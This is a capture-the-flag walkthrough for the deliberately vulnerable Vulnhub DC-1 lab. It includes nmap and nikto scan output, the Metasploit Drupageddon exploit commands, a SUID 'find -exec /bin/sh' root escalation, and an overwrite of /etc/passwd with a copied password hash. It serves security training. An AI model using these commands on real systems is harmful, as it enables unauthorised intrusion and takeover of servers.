# DC 1: Vulnhub Walkthrough

**DESCRIPTION**: DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.
There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges. 
Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.
Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.

 

## Scanning

**nmap 192.168.122.184**

![DC%201/Untitled.png](DC%201/Untitled.png)

**nmap -sV -A 192.168.122.184 (service version scan)**

**nmap -sV -A --script vuln 192.168.122.184 (Vulnerability scan)**

```jsx
root@kali:~# **nmap -sV -A 192.168.122.184**
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-05-27 02:58 EDT
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.32% done; ETC: 02:59 (0:00:00 remaining)
Nmap scan report for 192.168.122.184
Host is up (0.00050s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37269/tcp6  status
|   100024  1          37988/udp6  status
|   100024  1          41544/tcp   status
|_  100024  1          52100/udp   status
MAC Address: 00:0C:29:85:71:95 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.122.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
root@kali:~#

root@kali:~# nmap -sV -A --script vuln 192.168.122.184 
Starting Nmap 7.80SVN ( https://nmap.org ) at 2021-05-27 02:59 EDT
Stats: 0:06:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.75% done; ETC: 03:05 (0:00:01 remaining)
Nmap scan report for 192.168.122.184
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.0p1: 
|     	EDB-ID:21018	10.0	https://vulners.com/exploitdb/EDB-ID:21018	*EXPLOIT*
|     	CVE-2001-0554	10.0	https://vulners.com/cve/CVE-2001-0554
|     	CVE-2015-5600	8.5	https://vulners.com/cve/CVE-2015-5600
|     	SSV:92672	7.8	https://vulners.com/seebug/SSV:92672	*EXPLOIT*
|     	EXPLOITPACK:E5D04C36F9489108EC556F7F15E40911	7.8	https://vulners.com/exploitpack/EXPLOITPACK:E5D04C36F9489108EC556F7F15E40911	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2017-5850	7.8	https://vulners.com/cve/CVE-2017-5850
|     	1337DAY-ID-26918	7.8	https://vulners.com/zdt/1337DAY-ID-26918*EXPLOIT*
|     	1337DAY-ID-26888	7.8	https://vulners.com/zdt/1337DAY-ID-26888*EXPLOIT*
|     	SSV:61450	7.5	https://vulners.com/seebug/SSV:61450	*EXPLOIT*
|     	EXPLOITPACK:A791662850DB9C95039B0EBCE3D92493	7.5	https://vulners.com/exploitpack/EXPLOITPACK:A791662850DB9C95039B0EBCE3D92493	*EXPLOIT*
|     	CVE-2020-16088	7.5	https://vulners.com/cve/CVE-2020-16088
|     	CVE-2017-1000372	7.5	https://vulners.com/cve/CVE-2017-1000372
|     	CVE-2014-1692	7.5	https://vulners.com/cve/CVE-2014-1692
|     	PACKETSTORM:155764	7.2	https://vulners.com/packetstorm/PACKETSTORM:155764	*EXPLOIT*
|     	MSF:EXPLOIT/OPENBSD/LOCAL/DYNAMIC_LOADER_CHPASS_PRIVESC/	7.2	https://vulners.com/metasploit/MSF:EXPLOIT/OPENBSD/LOCAL/DYNAMIC_LOADER_CHPASS_PRIVESC/	*EXPLOIT*
|     	MSF:EXPLOIT/OPENBSD/LOCAL/DYNAMIC_LOADER_CHPASS_PRIVESC	7.2	https://vulners.com/metasploit/MSF:EXPLOIT/OPENBSD/LOCAL/DYNAMIC_LOADER_CHPASS_PRIVESC	*EXPLOIT*
|     	EXPLOITPACK:1AB9435EE9741F5C164FF2FFA781A1A6	7.2	https://vulners.com/exploitpack/EXPLOITPACK:1AB9435EE9741F5C164FF2FFA781A1A6	*EXPLOIT*
|     	EDB-ID:47803	7.2	https://vulners.com/exploitdb/EDB-ID:47803	*EXPLOIT*
|     	EDB-ID:41173	7.2	https://vulners.com/exploitdb/EDB-ID:41173	*EXPLOIT*
|     	CVE-2019-19726	7.2	https://vulners.com/cve/CVE-2019-19726
|     	1337DAY-ID-33695	7.2	https://vulners.com/zdt/1337DAY-ID-33695*EXPLOIT*
|     	CVE-2015-6564	6.9	https://vulners.com/cve/CVE-2015-6564
|     	CVE-2017-1000373	6.4	https://vulners.com/cve/CVE-2017-1000373
|     	SSV:61911	5.8	https://vulners.com/seebug/SSV:61911	*EXPLOIT*
|     	CVE-2014-2653	5.8	https://vulners.com/cve/CVE-2014-2653
|     	CVE-2014-2532	5.8	https://vulners.com/cve/CVE-2014-2532
|     	SSV:60656	5.0	https://vulners.com/seebug/SSV:60656	*EXPLOIT*
|     	CVE-2019-8460	5.0	https://vulners.com/cve/CVE-2019-8460
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2010-5107	5.0	https://vulners.com/cve/CVE-2010-5107
|     	SSV:90447	4.6	https://vulners.com/seebug/SSV:90447	*EXPLOIT*
|     	EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	EDB-ID:45210	4.6	https://vulners.com/exploitdb/EDB-ID:45210	*EXPLOIT*
|     	EDB-ID:45001	4.6	https://vulners.com/exploitdb/EDB-ID:45001	*EXPLOIT*
|     	EDB-ID:45000	4.6	https://vulners.com/exploitdb/EDB-ID:45000	*EXPLOIT*
|     	EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963	*EXPLOIT*
|     	EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962	*EXPLOIT*
|     	CVE-2016-0778	4.6	https://vulners.com/cve/CVE-2016-0778
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2015-5352	4.3	https://vulners.com/cve/CVE-2015-5352
|     	CVE-2016-0777	4.0	https://vulners.com/cve/CVE-2016-0777
|     	CVE-2015-6563	1.9	https://vulners.com/cve/CVE-2015-6563
|     	PACKETSTORM:155658	0.0	https://vulners.com/packetstorm/PACKETSTORM:155658	*EXPLOIT*
|     	PACKETSTORM:140944	0.0	https://vulners.com/packetstorm/PACKETSTORM:140944	*EXPLOIT*
|     	EDB-ID:47780	0.0	https://vulners.com/exploitdb/EDB-ID:47780	*EXPLOIT*
|     	EDB-ID:42271	0.0	https://vulners.com/exploitdb/EDB-ID:42271	*EXPLOIT*
|     	EDB-ID:41278	0.0	https://vulners.com/exploitdb/EDB-ID:41278	*EXPLOIT*
|     	1337DAY-ID-5850	0.0	https://vulners.com/zdt/1337DAY-ID-5850	*EXPLOIT*
|_    	1337DAY-ID-33663	0.0	https://vulners.com/zdt/1337DAY-ID-33663*EXPLOIT*
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.122.184
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.122.184:80/
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://192.168.122.184:80/node?destination=node
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://192.168.122.184:80/user/password
|     Form id: user-pass
|     Form action: /user/password
|     
|     Path: http://192.168.122.184:80/user/register
|     Form id: user-register-form
|     Form action: /user/register
|     
|     Path: http://192.168.122.184:80/user
|     Form id: user-login
|     Form action: /user
|     
|     Path: http://192.168.122.184:80/user/
|     Form id: user-login
|_    Form action: /user/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /rss.xml: RSS or Atom feed
|   /robots.txt: Robots file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /: Drupal version 7 
|   /README: Interesting, a readme.
|   /README.txt: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /user/: Potentially interesting folder
|_http-server-header: Apache/2.2.22 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2014-3704: 
|   VULNERABLE:
|   Drupal - pre Auth SQL Injection Vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-3704
|         The expandArguments function in the database abstraction API in
|         Drupal core 7.x before 7.32 does not properly construct prepared
|         statements, which allows remote attackers to conduct SQL injection
|         attacks via an array containing crafted keys.
|           
|     Disclosure date: 2014-10-15
|     References:
|       http://www.securityfocus.com/bid/70595
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704
|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
|_      https://www.drupal.org/SA-CORE-2014-005
| vulners: 
|   cpe:/a:apache:http_server:2.2.22: 
|     	SSV:60913	7.5	https://vulners.com/seebug/SSV:60913	*EXPLOIT*
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	CVE-2013-2249	7.5	https://vulners.com/cve/CVE-2013-2249
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	SSV:60788	5.1	https://vulners.com/seebug/SSV:60788	*EXPLOIT*
|     	CVE-2013-1862	5.1	https://vulners.com/cve/CVE-2013-1862
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	SSV:62058	5.0	https://vulners.com/seebug/SSV:62058	*EXPLOIT*
|     	SSV:61874	5.0	https://vulners.com/seebug/SSV:61874	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2014-0231/	5.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0231/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2014-0231	5.0	https://vulners.com/cve/CVE-2014-0231
|     	CVE-2014-0098	5.0	https://vulners.com/cve/CVE-2014-0098
|     	CVE-2013-6438	5.0	https://vulners.com/cve/CVE-2013-6438
|     	CVE-2013-5704	5.0	https://vulners.com/cve/CVE-2013-5704
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573*EXPLOIT*
|     	SSV:60905	4.3	https://vulners.com/seebug/SSV:60905	*EXPLOIT*
|     	SSV:60657	4.3	https://vulners.com/seebug/SSV:60657	*EXPLOIT*
|     	SSV:60653	4.3	https://vulners.com/seebug/SSV:60653	*EXPLOIT*
|     	SSV:60345	4.3	https://vulners.com/seebug/SSV:60345	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2012-4558/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-4558/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2012-3499/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2012-3499/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-4558/	4.3	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-4558/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2012-3499/	4.3	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2012-3499/	*EXPLOIT*
|     	MSF:ILITIES/HPUX-CVE-2012-4558/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HPUX-CVE-2012-4558/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/	4.3	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-4558/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/	4.3	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2012-3499/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-4558/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2012-3499/	*EXPLOIT*
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2013-1896	4.3	https://vulners.com/cve/CVE-2013-1896
|     	CVE-2012-4558	4.3	https://vulners.com/cve/CVE-2012-4558
|     	CVE-2012-3499	4.3	https://vulners.com/cve/CVE-2012-3499
|     	CVE-2012-2687	2.6	https://vulners.com/cve/CVE-2012-2687
|_    	EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37269/tcp6  status
|   100024  1          37988/udp6  status
|   100024  1          41544/tcp   status
|_  100024  1          52100/udp   status
MAC Address: 00:0C:29:85:71:95 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.122.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 592.21 seconds
root@kali:~#
```

**nikto -h http://192.168.122.184**

```jsx
root@kali:~# **nikto -h http://192.168.122.184**
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.122.184
+ Target Hostname:    192.168.122.184
+ Target Port:        80
+ Start Time:         2021-05-27 02:59:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
^[[1;2C
+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Wed Nov 20 15:45:59 2013
+ Entry '/INSTALL.mysql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.pgsql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.sqlite.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/LICENSE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/MAINTAINERS.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ /update.php sent cookie: SESSb92387d52f258505b5e095606117b777=1A5Jc6hQklp_Tq4qqg9CGGWNCwsmx4fTgwET0dNiKJ4; expires=Sat, 19-Jun-2021 15:31:12 GMT; path=/; HttpOnly
+ Entry '/UPGRADE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 36 entries which should be manually viewed.
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /user/: This might be interesting...
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /README: README file found.
+ /update.php sent cookie: SESSb92387d52f258505b5e095606117b777=C_Jakgls7ALlz_Siu1x59g1C4lDUpNjop-kWK8MUCQ8; expires=Sat, 19-Jun-2021 15:43:56 GMT; path=/; HttpOnly
+ OSVDB-3092: /UPGRADE.txt: Default file found.
+ OSVDB-3092: /install.php: Drupal install.php file found.
+ OSVDB-3092: /install.php: install.php file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.
+ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.
+ OSVDB-3233: /icons/README: Apache default file found.

+ 9194 requests: 0 error(s) and 42 item(s) reported on remote host
+ End Time:           2021-05-27 03:23:44 (GMT-4) (1429 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~#
```

## Exploitation

drupal 7 is vulnerable and its exploit is available in metasploit

**use exploit/multi/http/drupal_drupageddon**

**set rhost 192.168.122.184**

**show options**

![DC%201/Untitled%201.png](DC%201/Untitled%201.png)

**exploit**

**shell**

**id** 

**whoami**

![DC%201/Untitled%202.png](DC%201/Untitled%202.png)

**ls**

![DC%201/Untitled%203.png](DC%201/Untitled%203.png)

**cat flag1.txt**

![DC%201/Untitled%204.png](DC%201/Untitled%204.png)

**cd flag4**

**ls -al**

**cat flag4.txt**

![DC%201/Untitled%205.png](DC%201/Untitled%205.png)

## Privilege Escalation

**find / -perm -4000 2>/dev/null**

![DC%201/Untitled%206.png](DC%201/Untitled%206.png)

**find . -exec /bin/sh \; -quit**

**id**

www-data user have root privileges. We can now change /etc/passwd

![DC%201/Untitled%207.png](DC%201/Untitled%207.png)

cat /etc/passwd

copy password of root user in your system from /etc/shadow and paste in /etc/passwd file of target root user.

![DC%201/Untitled%208.png](DC%201/Untitled%208.png)

**cat > /etc/passwd**

![DC%201/Untitled%209.png](DC%201/Untitled%209.png)

**su root**

**id**

**whoami**

![DC%201/Untitled%2010.png](DC%201/Untitled%2010.png)

**cd /root**

**ls**

**cat thefinalflag.txt**

![DC%201/Untitled%2011.png](DC%201/Untitled%2011.png)
